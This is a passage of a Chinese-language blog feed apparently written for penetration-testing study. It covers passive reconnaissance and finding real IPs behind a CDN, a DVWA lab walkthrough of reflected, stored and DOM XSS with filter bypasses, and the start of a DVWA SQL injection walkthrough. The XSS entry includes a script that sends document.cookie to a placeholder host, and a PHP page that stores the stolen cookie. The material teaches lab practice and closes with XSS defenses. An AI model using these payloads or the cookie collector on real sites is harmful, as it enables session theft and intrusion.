访问，可能会获取真实<code>IP</code></p></li><li><p>查询域名解析记录。可能目标网站以前并没有使用<code>CDN</code>，可以通过<code>NETCRAFT</code>(<a href="https://www.netcraft.com/" target="_blank" rel="noopener">https://www.netcraft.com/</a>) 来观察域名的<code>IP</code>历史记录，可以大致分析出目标真实<code>IP</code>段</p></li><li><p>目标网站<code>APP</code>。若目标网站有<code>APP</code>，可以利用<code>Burp Suite</code>抓取<code>APP</code>请求，查找目标真实<code>IP</code></p></li><li><p>绕过<code>CloudFlare CDN</code>查找真实<code>IP</code>。很多网站使用<code>CloudFlare</code>提供<code>CDN</code>服务，可以尝试通过在线网站<code>CloudFlareWatch</code>(<a href="http://www.crimeflare.org:82/" target="_blank" rel="noopener">http://www.crimeflare.org:82/</a>) 对网站进行真实<code>IP</code>查询</p></li></ol><h2 id="验证IP的真实性"><a href="#验证IP的真实性" class="headerlink" title="验证IP的真实性"></a>验证IP的真实性</h2><ol><li><p>查看域名访问与<code>IP</code>访问的页面返回状态是否一致</p></li><li><p>对于<code>IP</code>段，可以批量扫描<code>IP</code>段中开启常见<code>web</code>端口的主机，对其进行访问以判断</p></li></ol><h1 id="收集敏感文件目录"><a href="#收集敏感文件目录" class="headerlink" title="收集敏感文件目录"></a>收集敏感文件目录</h1><p>探测<code>web</code>目录结构和隐藏的敏感文件可以获取网站后台管理界面、文件上传界面，甚至可以获取到网站的源代码</p><p>针对网站目录的扫描有：<code>DirBuster</code>、御剑后台扫描珍藏版、<code>wwwscan</code>、<code>spinder.py</code>、<code>Sensitivefilescan</code>、<code>Weakfilescan</code>等</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>信息收集--被动</title>
    <link href="http://yoursite.com/2019/05/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2019/05/14/信息收集/</id>
    <published>2019-05-14T12:26:00.000Z</published>
    <updated>2020-03-04T15:37:50.918Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p><strong>越是了解测试目标，测试的工作越容易</strong></p><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><ol><li><p>从公开渠道获得目标信息</p></li><li><p>与目标系统不产生直接的交互</p></li><li><p>尽量避免留下一切痕迹</p></li></ol><h1 id="公开资源情报计划"><a href="#公开资源情报计划" class="headerlink" title="公开资源情报计划"></a>公开资源情报计划</h1><p><code>Open source intelligence</code>，简称<code>OSINT</code></p><p>是美国中央情报局(<code>CIA</code>)的一种情报搜集手段，从各种公开的信息资源中寻找和获取有价值的情报</p><h1 id="被动信息收集内容"><a href="#被动信息收集内容" class="headerlink" title="被动信息收集内容"></a>被动信息收集内容</h1><ol><li><p><code>IP</code>地址段</p></li><li><p>域名、子域名信息</p></li><li><p>邮件地址</p></li><li><p>文档图片数据</p></li><li><p>公司地址</p></li><li><p>公司组织架构</p></li><li><p>联系电话</p></li><li><p>人员姓名/职务</p></li><li><p>公开的商业信息</p></li></ol><h1 id="被动信息收集用途"><a href="#被动信息收集用途" class="headerlink" title="被动信息收集用途"></a>被动信息收集用途</h1><ol><li><p>描述目标</p></li><li><p>社会工程学攻击</p></li><li><p>查找物理缺口</p></li></ol><h1 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h1><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>用于域名解析为<code>IP</code>地址</p><p><code>FQDN</code>：完全限定域名，<code>www.baidu.com</code></p><p>域名：<code>baidu.com</code></p><p>域名记录：</p><ol><li><p><code>A</code>记录：主机记录，用于将一个域名解析到一个<code>IP</code>地址上</p></li><li><p><code>C name</code>记录：别名记录，将一个域名解析到另一个域名上</p></li><li><p><code>NS</code>记录：定义和注册域名服务器地址</p></li><li><p><code>MX</code>记录：邮件交换记录</p></li><li><p><code>ptr</code>记录：通过<code>IP</code>地址反向解析域名</p></li><li><p><code>AAAA</code>记录：<code>IPv6</code>下的<code>A</code>记录</p></li></ol><h2 id="域名解析查询"><a href="#域名解析查询" class="headerlink" title="域名解析查询"></a>域名解析查询</h2><h3 id="NSLOOKUP"><a href="#NSLOOKUP" class="headerlink" title="NSLOOKUP"></a>NSLOOKUP</h3><ol><li><p>直接解析</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">&gt; www.baidu.com</span><br></pre></td></tr></table></figure><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/1.png" alt="1.png"></p></li><li><p>设置查询域名记录类型</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; set q=mx等同于set type=mx</span><br><span class="line">&gt; set q=any</span><br></pre></td></tr></table></figure><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/2.png" alt="2.png"></p><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/3.png" alt="3.png"></p></li><li><p>设置自定义域名服务器</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; server 114.114.114.114</span><br></pre></td></tr></table></figure><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/4.png" alt="4.png"></p></li><li><p>组合查询</p><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/5.png" alt="5.png"></p></li></ol><h3 id="DIG"><a href="#DIG" class="headerlink" title="DIG"></a>DIG</h3><ol><li><p>常规查询</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig baidu.com any @114.114.114.114</span><br></pre></td></tr></table></figure><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/6.png" alt="6.png"></p></li><li><p>路由追踪</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +trace www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/xinxishouji/7.png" alt="7.png"></p><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/8.png" alt="8.png"></p></li></ol><h2 id="子域名信息"><a href="#子域名信息" class="headerlink" title="子域名信息"></a>子域名信息</h2><h3 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h3><ol><li><p><a href="https://searchdns.netcraft.com/" target="_blank" rel="noopener">https://searchdns.netcraft.com/</a></p></li><li><p><code>Google</code>语法：<code>site:xxx.com</code></p></li><li><p>许多第三方服务汇聚大量<code>DNS</code>数据集</p><ol><li><p><code>DNSdumpster</code>网站（<a href="https://dnsdumpster.com）" target="_blank" rel="noopener">https://dnsdumpster.com）</a></p></li><li><p>子域名爆破网站（<a href="https://phpinfo.me/domain）" target="_blank" rel="noopener">https://phpinfo.me/domain）</a></p></li><li><p><code>IP</code>反查绑定域名网站（<a href="http://dns.aizhan.com）" target="_blank" rel="noopener">http://dns.aizhan.com）</a></p></li></ol></li></ol><h3 id="子域名检测工具"><a href="#子域名检测工具" class="headerlink" title="子域名检测工具"></a>子域名检测工具</h3><ol><li><p><code>Layer</code>子域名挖掘机</p><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/9.png" alt="9.png"></p></li><li><p><code>K8</code></p></li><li><p><code>wydomain</code></p></li><li><p><code>Sublist3r</code></p></li><li><p><code>dnsmaper</code></p></li><li><p><code>subDomainsBrute</code></p><p> 可递归查询三级、四级、五级域名</p><p> <code>python subDomainsbrute.py xxx.com</code></p></li><li><p><code>Maltego CE</code></p></li></ol><h2 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p><code>whois</code>用于查询域名是否已被注册以及注册域名的详细信息的数据库（域名所有人、域名注册商等）</p><p><code>kali</code>中默认集成<code>whois</code></p><p><img src="/images/KaliLinux_shentouceshi/xinxishouji/10.png" alt="10.png"></p><p><img src="/images/KaliLinux_shentouceshi/xinxishouji/11.png" alt="11.png"></p><p>在线<code>whois</code>查询工具有：</p><ol><li><p>爱站工具网（<a href="https://whois.aizhan.com）" target="_blank" rel="noopener">https://whois.aizhan.com）</a></p></li><li><p>站长之家（<a href="http://whois.chinaz.com）" target="_blank" rel="noopener">http://whois.chinaz.com）</a></p></li><li><p><code>VirusTotal</code>（<a href="https://www.virustotal.com）" target="_blank" rel="noopener">https://www.virustotal.com）</a></p></li></ol><h2 id="域名备案信息"><a href="#域名备案信息" class="headerlink" title="域名备案信息"></a>域名备案信息</h2><p>根据国家法律规定，网站所有者需要向国家有关部门申请备案。主要针对国内网站，若网站服务器搭建在其他国家，则不需要备案</p><ol><li><p><code>ICP</code>备案查询网（<a href="http://www.beianbeian.com）" target="_blank" rel="noopener">http://www.beianbeian.com）</a></p></li><li><p>天眼查（<a href="http://www.tianyancha.com）" target="_blank" rel="noopener">http://www.tianyancha.com）</a></p></li></ol><h1 id="证书透明度公开日志枚举"><a href="#证书透明度公开日志枚举" class="headerlink" title="证书透明度公开日志枚举"></a>证书透明度公开日志枚举</h1><p>证书透明度（<code>CT</code>），是证书授权机构<code>CA</code>的一个项目，证书授权机构会将每个<code>SSL/TLS</code>证书发布到公共日志中</p><p>一个<code>SSL/TLS</code>证书通常包含域名、子域名和邮件地址</p><ol><li><p><code>ctr.sh</code>（<a href="https://crt.sh）" target="_blank" rel="noopener">https://crt.sh）</a></p></li><li><p><code>censys</code>（<a href="https://censys.io）" target="_blank" rel="noopener">https://censys.io）</a></p></li></ol><h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><h2 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h2><ol><li><p><code>intext:(仅google)</code>——搜索正文内容</p></li><li><p><code>intitle:</code>——搜索标题内容</p></li><li><p><code>cache:</code>——搜索搜索引擎缓存内容</p></li><li><p><code>inurl:</code>——搜索特定<code>URL</code></p></li><li><p><code>site:</code>——指定搜索特定的站点</p></li><li><p><code>filetype:</code>——指定访问的文件类型</p></li><li><p><code>link:</code>——指定链接的网页</p></li><li><p><code>related:</code>——搜索相似类型的网页</p></li><li><p><code>info:</code>——返回站点的指定信息</p></li><li><p><code>define:</code>——返回某个词语的定义</p></li><li><p><code>index of</code>——发现允许目录浏览的<code>web</code>网站</p></li><li><p>双引号：代表完全匹配搜索</p></li><li><p>加号：搜索包含加号后面词的页面</p></li><li><p>减号：代表搜索不包含减号后面的词的页面</p></li><li><p>星号：通配符</p></li></ol><p><code>Google hacking</code>大全：<a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><h2 id="网络搜索组件"><a href="#网络搜索组件" class="headerlink" title="网络搜索组件"></a>网络搜索组件</h2><ol><li><p><code>shodan</code>:<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p><p> <code>shodan</code>可以搜索网络空间中的所有联网设备，包括服务器、电脑、手机、摄像头等</p></li><li><p>zoomeye(钟馗之眼):<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p><p> <code>ZoomEye</code>是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。</p><p> <code>ZoomEye</code>拥有两大探测引擎：<code>Xmap</code>和<code>Wmap</code>，分别针对网络空间中的设备及网站，通过24小时不间断的探测、识别，标识出互联网设备及网站所使用的服务及组件。研究人员可以通过<code>ZoomEye</code>方便的了解组件的普及率及漏洞的危害范围等信息</p></li><li><p><code>fofa</code>:<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></p><p> 网络空间资产检索系统(<code>FOFA</code>)探索全球互联网的资产信息，进行资产及漏洞影响范围分析、应用分布统计、应用流行度态势感知等</p></li><li><p>云悉:<a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></p><p> <code>WEB</code>指纹扫描、<code>CMS</code>识别</p></li></ol><h1 id="maltego"><a href="#maltego" class="headerlink" title="maltego"></a>maltego</h1><p><img src="/images/KaliLinux_shentouceshi/xinxishouji/13.png" alt="13.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之XSS</title>
    <link href="http://yoursite.com/2019/05/13/DVWA1-10%E4%B9%8BXSS/"/>
    <id>http://yoursite.com/2019/05/13/DVWA1-10之XSS/</id>
    <published>2019-05-13T13:35:00.000Z</published>
    <updated>2020-02-24T04:20:17.884Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p><code>XSS</code>，全称<code>Cross Site Scripting</code>，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，<code>XSS</code>不仅仅限于<code>JavaScript</code>，还包括<code>flash</code>等其它脚本语言。根据恶意代码是否存储在服务器中，<code>XSS</code>可以分为存储型的<code>XSS</code>与反射型的<code>XSS</code></p><p><code>DOM</code>型的<code>XSS</code>由于其特殊性，常常被分为第三种，这是一种基于<code>DOM</code>树的<code>XSS</code>。例如服务器端经常使用<code>document.boby.innerHtml</code>等函数动态生成<code>html</code>页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生<code>DOM</code>型的<code>XSS</code>。与前两种<code>XSS</code>相比，它最大的特点就是不与后台服务器交互，只是通过浏览器的<code>DOM</code>树解析产生</p><hr><h1 id="常见XSS利用方式"><a href="#常见XSS利用方式" class="headerlink" title="常见XSS利用方式"></a>常见XSS利用方式</h1><p><code>&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p><p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p><p><code>&lt;DIV style=&quot;background-image:url(javascript:alert(&#39;1&#39;))&quot;&gt;</code></p><p><code>&lt;iframe onload=alert(1)&gt;</code></p><p><code>&lt;table&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;ul&gt;</code>等标签也可利用</p><hr><h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p><img src="/images/web_anquan/web_anquan6.png" alt="1.png"></p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹框</p><p><img src="/images/baji/dvwa/XSS/1.png" alt="1.png"></p><p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，获取<code>cookie</code></p><p><img src="/images/baji/dvwa/XSS/32.png" alt="32.png"></p><h3 id="XSS的一般收集方式"><a href="#XSS的一般收集方式" class="headerlink" title="XSS的一般收集方式"></a>XSS的一般收集方式</h3><ol><li><p>设计<code>XSS</code>注入代码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&apos;http://xxx.com/xss/HACK.php?x=&apos;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p> 访问<code>http://xxx.com/xss/HACK.php</code>这个网址，并且通过<code>x</code>传递一个变量，即要收集的<code>cookie</code></p></li><li><p>收集<code>cookie</code></p><p> <code>HACK.php</code>页面代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&apos;x&apos;];</span><br><span class="line">file_put_contents(&apos;cookie.txt&apos;, $cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><ol><li><p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，失败</p><p> <img src="/images/baji/dvwa/XSS/2.png" alt="2.png"></p><p> 发现<code>&lt;spirt&gt;</code>标签被过滤</p></li><li><p>双写绕过过滤</p><p> 输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>,成功弹窗</p><p> <img src="/images/baji/dvwa/XSS/3.png" alt="3.png"></p></li><li><p>大小写混淆绕过</p><p> 输入<code>&lt;ScRipt&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p><p> <img src="/images/baji/dvwa/XSS/4.png" alt="4.png"></p></li></ol><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/244.png" alt="24.png"></p><p><code>High</code>级别的代码同样使用黑名单过滤输入，<code>preg_replace()</code> 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中<code>i</code>表示不区分大小写）不再有效</p><p>输入<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code>，成功弹框</p><p><img src="/images/baji/dvwa/XSS/5.png" alt="5.png"></p><p>输入<code>&lt;iframe src=1 onload=alert(&#39;xss&#39;)&gt;</code>，成功弹窗</p><p><img src="/images/baji/dvwa/XSS/33.png" alt="33.png"></p><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/25.png" alt="25.png"></p><p><code>Impossible</code>级别的代码使用<code>htmlspecialchars</code>函数把预定义的字符<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&lt;</code>、<code>&gt;</code>转换为 <code>HTML</code>实体，防止浏览器将其作为<code>HTML</code>元素</p><hr><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p><img src="/images/web_anquan/web_anquan5.png" alt="1.png"></p><h2 id="LOW级别-1"><a href="#LOW级别-1" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/31.png" alt="31.png"></p><p><code>message</code>一栏输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹框</p><p><img src="/images/baji/dvwa/XSS/6.png" alt="6.png"></p><p><code>name</code>一栏前端有字数限制，抓包改为<code>&lt;script&gt;alert(&#39;name&#39;)&lt;/script&gt;</code>,成功弹窗</p><p><img src="/images/baji/dvwa/XSS/7.png" alt="7.png"></p><p><img src="/images/baji/dvwa/XSS/8.png" alt="8.png"></p><p>相关函数介绍</p><p><code>trim(string,charlist)</code>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、<code>\t</code>、<code>\n</code>、<code>\x0B</code>、<code>\r</code>以及空格，可选参数<code>charlist</code>支持添加额外需要删除的字符</p><p><code>mysql_real_escape_string(string,connection)</code>函数会对字符串中的特殊符号（<code>\x00</code>，<code>\n</code>，<code>\r</code>，<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，<code>\x1a</code>）进行转义</p><p><code>stripslashes(string)</code>函数删除字符串中的反斜杠</p><h2 id="Medium级别-1"><a href="#Medium级别-1" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/26.png" alt="26.png"></p><p>对<code>message</code>参数使用了<code>htmlspecialchars</code>函数进行编码，因此无法再通过<code>message</code>参数注入<code>XSS</code>代码，但是对于<code>name</code>参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型<code>XSS</code></p><ol><li><p>双写绕过</p><p> 抓包改<code>name</code>参数为<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p><p> <img src="/images/baji/dvwa/XSS/9.png" alt="9.png"></p><p> <img src="/images/baji/dvwa/XSS/10.png" alt="10.png"></p></li><li><p>大小写混淆绕过</p><p> 抓包改<code>name</code>参数为<code>&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p><p> <img src="/images/baji/dvwa/XSS/11.png" alt="11.png"></p><p> <img src="/images/baji/dvwa/XSS/12.png" alt="12.png"></p></li></ol><p>相关函数说明</p><p><code>strip_tags()</code>函数剥去字符串中的<code>HTML</code>、<code>XML</code>以及<code>PHP</code>的标签，但允许使用<code>&lt;b&gt;</code>标签</p><p><code>addslashes()</code>函数返回在预定义字符（单引号、双引号、反斜杠、<code>NULL</code>）之前添加反斜杠的字符串</p><h2 id="High级别-1"><a href="#High级别-1" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/27.png" alt="27.png"></p><p><code>name</code>使用正则表达式过滤了<code>&lt;script&gt;</code>标签，但是却忽略了<code>img</code>、<code>iframe</code>等其它危险的标签，因此<code>name</code>参数依旧存在存储型<code>XSS</code></p><p>抓包改<code>name</code>参数为<code>&lt;img src=1 onerror=alert(1)&gt;</code></p><p><img src="/images/baji/dvwa/XSS/13.png" alt="13.png"></p><p><img src="/images/baji/dvwa/XSS/14.png" alt="14.png"></p><h2 id="Impossible级别-1"><a href="#Impossible级别-1" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/28.png" alt="28.png"></p><p>通过使用<code>htmlspecialchars</code>函数，解决了<code>XSS</code>，但是要注意的是，如果<code>htmlspecialchars</code>函数使用不当，攻击者就可以通过编码的方式绕过函数进行<code>XSS</code>注入，尤其是<code>DOM</code>型的<code>XSS</code></p><hr><h1 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h1><h2 id="LOW级别-2"><a href="#LOW级别-2" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>页面本意是用于修改语言</p><p>对<code>default</code>参数进行构造<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></p><p><img src="/images/baji/dvwa/XSS/15.png" alt="15.png"></p><p>查看网页源代码，<code>JS</code>脚本插入到<code>&lt;option&gt;</code>标签中，被执行</p><p><img src="/images/baji/dvwa/XSS/16.png" alt="16.png"></p><h2 id="Medium级别-2"><a href="#Medium级别-2" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/29.png" alt="29.png"></p><p>使用了<code>stripos</code> 用于检测<code>default</code>值中是否有 <code>&lt;script</code>，如果有的话，则将<code>default=English</code></p><ol><li><p>对<code>default</code>参数进行构造<code>&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code>,失败</p><p> <img src="/images/baji/dvwa/XSS/17.png" alt="17.png"></p></li><li><p>查看源代码</p><p> 发现<code>JS</code>语句被插入为<code>&lt;option&gt;</code>的<code>value</code>值，未被执行</p><p> <img src="/images/baji/dvwa/XSS/18.png" alt="18.png"></p></li><li><p>要使<code>JS</code>语句执行，应先闭合<code>&lt;option&gt;</code>标签</p><p> 对<code>default</code>参数进行构造<code>&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code></p><p> <img src="/images/baji/dvwa/XSS/19.png" alt="19.png"></p><p> 执行失败，查看源代码</p><p> <img src="/images/baji/dvwa/XSS/20.png" alt="20.png"></p><p> <code>JS</code>代码被执行为<code>&lt;option value=&quot;&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;&quot;&gt;&gt;&lt;/option&gt;</code></p><p> <code>JS</code>代码中只有<code>&gt;</code>被插入到<code>option</code>标签的值中，因为<code>&lt;/option&gt;</code>闭合了<code>&lt;option&gt;</code>标签，所以<code>&lt;img&gt;</code>标签并没有插入</p></li><li><p>继续闭合<code>&lt;select&gt;</code>标签，使得<code>&lt;img&gt;</code>标签为独立的语句</p><p> 对<code>default</code>参数进行构造<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code>，成功弹框</p><p> <img src="/images/baji/dvwa/XSS/21.png" alt="21.png"></p><p> 查看源代码，<code>JS</code>代码已被执行</p><p> <img src="/images/baji/dvwa/XSS/22.png" alt="22.png"></p></li></ol><h2 id="High级别-2"><a href="#High级别-2" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/30.png" alt="30.png"></p><p>使用<code>switch</code>设置白名单，只允许传的<code>default</code>值为 <code>French</code>、<code>English</code>、<code>German</code>、<code>Spanish</code>其中一个</p><p>构造语句为<code>?default=English #&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><img src="/images/baji/dvwa/XSS/233.png" alt="23.png"></p><p>写入效果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;option value=&apos;&apos;&gt;English #&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/option&gt;</span><br></pre></td></tr></table></figure><p>注释部分的<code>javascript</code>代码不会被传到服务器端，<code>DOM</code>型<code>XSS</code>注入直接获取<code>URL</code>地址内容，则被执行</p><h2 id="Impossible级别-2"><a href="#Impossible级别-2" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>不在客户端做任何事</p><hr><h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><ol><li><p>对输入和<code>URL</code>参数进行过滤(白名单/黑名单)</p></li><li><p>对输出进行编码</p></li><li><p>在服务器端对<code>Cookie</code>设置<code>HttpOnly</code>属性</p></li><li><p>使用自动编码的安全框架</p></li><li><p>使用内容安全策略(<code>CSP</code>)</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之SQL注入</title>
    <link href="http://yoursite.com/2019/05/12/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/05/12/DVWA之SQL注入/</id>
    <published>2019-05-12T13:30:00.000Z</published>
    <updated>2020-02-24T04:20:31.134Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h1><p><code>SQL Injection</code>，即<code>SQL</code>注入，是指攻击者通过注入恶意的<code>SQL</code>命令，破坏<code>SQL</code>查询语句的结构，从而达到执行恶意<code>SQL</code>语句的目的。<code>SQL</code>注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，<code>SQL</code>注入仍是现在最常见的<code>Web</code>漏洞之一</p><p><img src="/images/web_anquan/web_anquan2.png" alt="1.png"></p><hr><h1 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h1><ol><li><p>判断是否存在注入，注入是字符型还是数字型</p><p> 当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入</p><p> 当输入的参数为字符串时，如果存在注入漏洞，可以认为是字符型注入</p><p>  字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</p></li><li><p>猜解<code>SQL</code>查询语句中的字段数</p></li><li><p>获取当前数据库</p></li><li><p>获取数据库中的表</p></li><li><p>获取表中的列名(字段名)</p></li><li><p>获取数据记录</p></li></ol><hr><h1 id="LOW级别漏洞利用"><a href="#LOW级别漏洞利用" class="headerlink" title="LOW级别漏洞利用"></a>LOW级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><ol><li><p>输入1，查询成功</p><p> <img src="/images/baji/dvwa/SQL Injection/1.png" alt="1.png"></p></li><li><p>输入<code>&#39;</code>，出现报错</p><p> <img src="/images/baji/dvwa/SQL Injection/4.png" alt="4.png"></p><p> 显示数据库为<code>MariaDB</code>，即<code>mysql</code></p></li><li><p>输入<code>1&#39; and &#39;1&#39;=&#39;1</code>，返回正常</p><p> <img src="/images/baji/dvwa/SQL Injection/2.png" alt="2.png"></p></li><li><p>输入<code>1&#39; and &#39;1&#39;=&#39;2</code>，无返回</p><p> <img src="/images/baji/dvwa/SQL Injection/3.png" alt="3.png"></p></li></ol><p>可进行逻辑运算，且出现数据库报错，此为基于报错的<code>SQL</code>注入</p><p>需使用<code>&#39;</code>引号来进行闭合，为字符型<code>SQL</code>注入</p><p>可猜出查询语句为<code>select [字段1,字段2,...] from 表 where 字段=&#39;&#39;;</code></p><h2 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" 